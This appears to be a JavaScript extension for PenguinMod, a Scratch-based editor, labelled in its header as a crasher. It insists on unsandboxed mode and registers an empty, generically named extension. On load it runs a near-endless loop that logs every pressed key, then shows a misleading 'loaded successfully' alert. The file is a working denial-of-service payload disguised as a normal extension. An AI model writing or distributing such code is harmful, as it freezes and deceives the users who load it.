/*
  Crash PenguinMod by https://github.com/NILEG2mc
*/
(async function(Scratch) {
    const variables = {};


    if (!Scratch.extensions.unsandboxed) {
        alert("This extension needs to be unsandboxed to run!")
        return
    }

    const ExtForge = {
        Broadcasts: new function() {
            this.raw_ = {};
            this.register = (name, blocks) => {
                this.raw_[name] = blocks;
            };
            this.execute = async (name) => {
                if (this.raw_[name]) {
                    await this.raw_[name]();
                };
            };
        },

        Variables: new function() {
            this.raw_ = {};
            this.set = (name, value) => {
                this.raw_[name] = value;
            };
            this.get = (name) => {
                return this.raw_[name] ?? null;
            }
        },

        Utils: {
            setList: (list, index, value) => {
                [...list][index] = value;
                return list;
            },
            lists_foreach: {
                index: [0],
                value: [null],
                depth: 0
            },
            countString: (x, y) => {
                return y.length == 0 ? 0 : x.split(y).length - 1
            }
        }
    }

    class Extension {
        getInfo() {
            return {
                "id": "extensionID",
                "name": "Extension",
                "color1": "#0fbd8c",
                "blocks": []
            }
        }
    }

    let extension = new Extension();
    (async () => {
        for (var temp_df87ff3f492a03238c132331 = 0; temp_df87ff3f492a03238c132331 < (1e+102); temp_df87ff3f492a03238c132331++) {
            console.log(Scratch.vm.runtime.ioDevices.keyboard.getAllKeysPressed());
        };
        eval(("alert(\"SMYTHINGS LOADED SUCCESFULLY!\")"))
    })();

    Scratch.extensions.register(extension);
})(Scratch);
